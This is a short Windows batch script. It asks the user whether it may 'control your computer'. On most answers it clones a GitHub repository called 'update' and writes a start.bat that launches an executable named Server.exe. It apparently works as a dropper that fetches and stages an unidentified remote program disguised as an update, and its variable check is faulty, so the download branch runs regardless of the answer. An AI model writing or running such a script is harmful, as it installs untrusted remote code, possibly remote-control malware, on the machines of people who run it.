@echo off
cls
 for /l %%i in (0,1,2) do (
  set /p v="can I control your computer, if yes then press any key and enter, if not then close: "
  if "%v%"=="Yes" (
    echo RIGHT
  ) else (
    git clone https://github.com/Dambo389/update.git
@echo start update\update\Server.exe>start.bat
 )
)